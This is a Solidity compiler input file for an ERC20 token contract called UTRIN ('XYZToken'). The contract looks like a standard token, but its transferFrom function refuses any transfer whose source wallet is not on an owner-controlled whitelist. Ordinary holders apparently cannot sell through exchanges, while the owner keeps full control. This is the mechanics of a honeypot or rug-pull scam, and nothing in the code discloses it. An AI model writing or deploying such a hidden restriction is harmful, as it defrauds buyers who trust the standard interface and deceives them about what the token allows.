{"language":"Solidity","settings":{"libraries":{},"metadata":{"useLiteralContent":true},"optimizer":{"enabled":false,"runs":200},"remappings":[],"outputSelection":{"*":{"*":["*"],"":["*"]}}},"sources":{"browser/Utrin.sol":{"content":"// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.7.4;\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n \ncontract XYZToken is IERC20 {\n    string public constant symbol = \"utrin.io\";\n    string public constant name = \"UTRIN\";\n    uint8 public constant decimals = 18;\n    uint256 _totalSupply = 9000000*10**18;\n    \n    // Owner of this contract\n    address public owner;\n \n    // Balances for each account\n    mapping(address => uint256) balances;\n \n    // Owner of account approves the transfer of an amount to another account\n    mapping(address => mapping (address => uint256)) allowed;\n    mapping (address => bool) public whitelisted;\n\n  function addWhitelist (address addr) public onlyOwner {\n    whitelisted[addr] = true;\n    }\n    \n    function removeWhitelist (address addr) public onlyOwner {\n        whitelisted[addr] = false;\n    }\n\n    modifier onlyOwner {\n        require(\n            msg.sender == owner,\n            \"Only owner can call this function.\"\n        );\n        _;\n    }\n \n \n    modifier onlyWhitelisted{\n          require(\n            whitelisted[msg.sender]== true,\n            \"Only whitelisted walled can call this function.\"\n        );\n        _;\n    }\n \n \n \n \n \n    // Constructor\n    constructor () {\n        owner = msg.sender;\n        balances[owner] = _totalSupply;\n        whitelisted[owner] = true;\n    }\n \n    function totalSupply() view  public  override returns (uint256 supply) {\n        return _totalSupply;\n    }\n \n    // What is the balance of a particular account?\n    function balanceOf(address _owner) view public  override returns (uint256 balance) {\n        return balances[_owner];\n    }\n \n    // Transfer the balance from owner's account to another account\n    function transfer(address _to, uint256 _amount) public   override returns (bool success) {\n        \n       \n        if (balances[msg.sender] >= _amount \n            && _amount > 0\n            && balances[_to] + _amount > balances[_to]) {\n            balances[msg.sender] -= _amount;\n            balances[_to] += _amount;\n            emit  Transfer(msg.sender, _to, _amount);\n            return true;\n        } else {\n            return false;\n        }\n    }\n \n    \n    \n    \n    function transferFrom(\n        address _from,\n        address _to,\n        uint256 _amount\n    ) override   public   returns (bool success) {\n          require(\n            whitelisted[_from]== true,\n            \"Only whitelisted wallet can call this function.\"\n        );\n        if (balances[_from] >= _amount\n            && allowed[_from][msg.sender] >= _amount\n            && _amount > 0\n            && balances[_to] + _amount > balances[_to]) {\n            balances[_from] -= _amount;\n            allowed[_from][msg.sender] -= _amount;\n            balances[_to] += _amount;\n           emit  Transfer(_from, _to, _amount);\n            return true;\n        } else {\n            return false;\n        }\n    }\n \n    // Allow _spender to withdraw from your account, multiple times, up to the _value amount.\n    // If this function is called again it overwrites the current allowance with _value.\n    function approve(address _spender, uint256 _amount)public  override returns  (bool success) {\n        allowed[msg.sender][_spender] = _amount;\n       emit  Approval(msg.sender, _spender, _amount);\n        return true;\n    }\n \n    function  allowance(address _owner, address _spender)   public   view override returns (uint256 remaining) {\n        return allowed[_owner][_spender];\n    }\n} "}}}